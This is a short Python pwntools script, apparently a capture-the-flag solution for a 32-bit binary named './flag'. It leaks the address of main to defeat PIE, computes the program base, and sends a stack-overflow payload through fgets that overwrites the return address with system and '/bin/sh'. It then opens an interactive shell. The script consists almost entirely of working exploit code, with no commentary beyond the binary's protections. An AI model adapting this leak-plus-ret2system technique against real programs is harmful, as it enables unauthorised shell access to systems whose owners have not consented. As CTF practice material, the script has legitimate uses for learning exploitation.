#!/usr/bin/python3

"""
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
"""

binary_path = "./flag"
remote_addr = ('host', 'port')

#############################
from pwn import *;DEBUG=context.log_level==logging.DEBUG;p=process(binary_path);elf=p.elf;p=remote(*remote_addr) if args["REMOTE"] else p;
#############################

# Exploit

addr = dict()

p.recvuntil("to help heres an address: ")
addr["leak"] = int(p.recvline(), 16)
elf.address = addr["base"] = addr["leak"] - elf.symbols["main"]
log.info(f'Leaked address program base: {hex(addr["base"])}')

p.sendline('b')

# fgets(ebp-0x8, 0x80, stdin)

payload = fit({
    0x8+4:   p32(elf.symbols['system']), 
    0x8+4+8: p32(next(elf.search(b'/bin/sh'))),
}, filler=b'\x90')
p.sendline(payload)

p.interactive()